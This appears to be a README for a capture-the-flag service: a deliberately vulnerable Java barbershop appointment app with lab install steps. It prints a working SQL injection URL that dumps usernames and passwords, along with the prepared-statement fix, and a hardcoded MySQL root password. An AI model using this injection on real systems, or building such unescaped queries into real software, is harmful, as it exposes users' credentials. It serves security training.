Benjamin Barkers Barbershop
===========================

Introduction
------------
Benjamin Barkers Barbershop is a Java based web application for managing appointments
in a barbershop. Users can schedule an appointment in free slot in a time table using
a username and password. The task is to steal these credentials.

Bug
---
Behind the scenes are several Java servlets that search and update a MySQL database.
The input for the SQL calls are very poorly checked and so contains lots of SQL
injection vectors...some even inband.

Exploitable URL:
http://localhost:8080/barbershop/listmyappointments?time=0&user=bogus&pass=bogus' and 1=2 union select 1, 1, 1,  concat(name,char(64),password), name from users where '1'='1

Fix
---
The Database class needs to either escape user inputs or be changed to use prepared
statements in which case the database driver will take the responsibility of escaping
the input.

Extra assignment
----------------
Java is easily decompiled, so as an extra assignment the source code could be held back.
The teams should still be able to extract the files from the 'war' file, decompile them,
fix the bug, recompile and rebuild the archive.

Install
-------
1) Build an archive

 $ make
 tar czf Barbershop.tar.gz --exclude-vcs -C .. Barbershop/build.xml Barbershop/src Barbershop/lib Barbershop/html Barbershop/conf Barbershop/db.sql
 $

2) Copy archive to team server

 $ scp Barbershop.tar.gz robert@192.168.122.101:
 Barbershop.tar.gz                            100% 1168KB   1.1MB/s   00:00
 $

3) Become root on team server

 $ ssh robert@192.168.122.101
 $ sudo -s
 #

4) Install needed packages (remember MySQL root users password)

 # apt-get -y install openjdk-6-jdk jetty ant mysql-client mysql-server

5) Make servlet API available to Ant

 # ln -s /usr/share/java/servlet-api-2.5.jar /usr/share/ant/lib

6) Configure Jetty to begin at startup

 # sed -e 's/NO_START=1/NO_START=0/g' -e 's/#JETTY_HOST.*/JETTY_HOST=0.0.0.0/g' < /etc/default/jetty > out && mv out /etc/default/jetty


7) Unpack in /var/services on team server

 # mkdir /var/services
 # cd /var/services
 # tar xfz $HOME/Barbershop.tar.gz

8) Build and install archive from source (MySQL root password is 'blar')

 # cd Barbershop
 # mysql -u root -pblar < db.sql
 # ant deploy

9) Restart server

 # reboot

10) Optionally delete the source code

 # cd /root
 # rm -rf /var/services/Barbershop
 # rm -f $HOME/Barbershop.tar.gz

Game server
-----------
The flag deliver and check script requires the 'curl' package to be installed on the game server.

Verify
------
The installation is verified by visiting http://192.168.122.101:8080/barbershop
and making an appointment.
